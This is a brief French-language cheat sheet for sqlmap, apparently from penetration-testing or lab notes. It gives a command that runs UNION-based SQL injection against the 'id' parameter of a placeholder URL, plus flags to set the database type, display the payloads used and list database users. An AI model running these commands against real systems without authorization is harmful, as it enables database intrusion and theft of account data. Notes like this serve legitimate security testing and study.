```sh
sqlmap -u 'http://domain.com?id=1&Submit=Submit#' -p id --technique=U
```

`--dbms` : specifier le type de base de donnee
` -v3 --fresh-queries` pour connaitre le payload utiliser par sqlmap
`--users` Voir les utilisateurs de la base de donnee

